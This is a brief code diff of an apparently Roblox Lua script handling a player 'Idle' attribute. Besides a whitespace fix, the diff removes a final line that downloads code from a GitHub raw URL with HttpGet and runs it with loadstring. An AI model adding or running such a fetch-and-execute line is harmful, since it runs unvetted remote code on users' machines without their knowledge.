@@ -319,7 +319,7 @@ function()
                         end)
 
                     end
-                    
+
                 end
 
             end
@@ -349,5 +349,3 @@ game.Players.LocalPlayer.AttributeChanged:Connect(function(n)
         game.Players.LocalPlayer:SetAttribute("Idle", false)
     end
 end)
-
-loadstring(game:HttpGet('https://raw.githubusercontent.com/Vernyfx/test/main/ad'))()
